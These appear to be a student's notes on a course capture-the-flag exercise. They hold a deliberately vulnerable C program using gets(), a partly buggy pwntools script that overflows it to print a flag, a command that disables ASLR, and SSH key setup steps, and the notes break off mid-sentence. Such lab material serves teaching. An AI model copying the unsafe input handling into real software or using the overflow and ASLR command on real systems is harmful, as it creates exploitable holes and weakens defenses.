`stack0r`
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
	volatile int unsecured = 0;
	char buffer[{{buffsize}}];
	FILE *fp;

	gets(buffer);
	fp = fopen("./flag.txt", "r");

	if(unsecured != 0) {
		printf("The 'unsecured' variable has been changed!\n");
		printf("Warning! Multiool is no longer in security mode\n");
		fgets(buffer, 64, (FILE*)fp);

		printf("flag: %s\n", buffer );
	} 
	else {
		printf("Try again?\n");
	}
}
```
- solve in docker, not on the course server

`exploit.py`
```python
from pwn import *

elf = ELF('./stack0-64')
context.binary=elf
context.log_level = 'debug'

#connect to the ssh server and automatically get the flag
s = ssh['kcjesse', 'cs4401.walls.ninja', keyfile='../keyfile']
s.set_working_directory('/problems/stack0r-64_3_52a9d8eafadefebc6c9c5da0e766b02e/')
p = s.process('./stack0-64');

#opens in gdb
p = gdb.debug('./stack0-64', gdbscript'''
				break stack0.c:12
				shell tmux select-layout main-vertical
				shell tmux swap-pane -U
				continue
				''')
p.sendline(b'a'*133)

p.recvall() #gets all data
p.wait() #wait until process is finished
```
note about `sendline()`: adds a newline `\n` character after the text

add code to solve on the server
```python
s = ssh('kcjesse', 'cs4401.walls.ninja', keyfile='../keyfile')
s.set_working_directory('/problems/stack0r-64_3_52a9d8eafadefebc6c9c5da0e766b02e/')
p = s.process('./stack0-64');

```

### ASLR
- address randomization, changes the 
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
### SSH KEY STUFF
```bash
# Generate the key pair for username bro 
ssh-keygen -t rsa -f ./kcjesse_ssh_key -C kcjesse -b 2048 
# Install the public key on the server 
ssh-copy-id -i kcjesse_ssh_key.pub kcjesse@cs4401shell.walls.ninja 
# Test to make sure the public key was created correctly 
ssh -i ./keys/kcjesse_ssh_key kcjesse@cs4401shell.walls.ninja

ssh kcjesse@cs4401shell.walls.ninja
```

Recall [[Memory Virtualization]]
- The Address Space is 